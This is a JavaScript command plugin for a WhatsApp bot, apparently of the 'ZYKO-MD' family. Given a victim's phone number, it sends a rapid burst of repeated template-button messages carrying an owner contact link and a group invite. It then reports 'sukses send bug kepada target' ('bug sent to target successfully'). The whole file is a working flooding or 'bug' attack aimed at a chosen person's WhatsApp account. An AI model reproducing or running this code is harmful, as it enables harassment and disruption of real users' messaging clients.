async function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}

let handler = async (m, { conn, text }) => {
if (!text) throw 'Masukan Nomor....'
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 await sleep(20)
 conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 await sleep(20)
 conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
conn.sendMessage(text + '@s.whatsapp.net', { 
text: 'POWERED BY ZYKO-MD VVIP', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6282124690625'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://chat.whatsapp.com/BYgplteysuvLVMS1wYfq3f'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 reply('sukses send bug kepada target')
}
handler.help = ['👽 628xxxx']
handler.command = /^(👽)$/i
handler.owner = true 
export default handler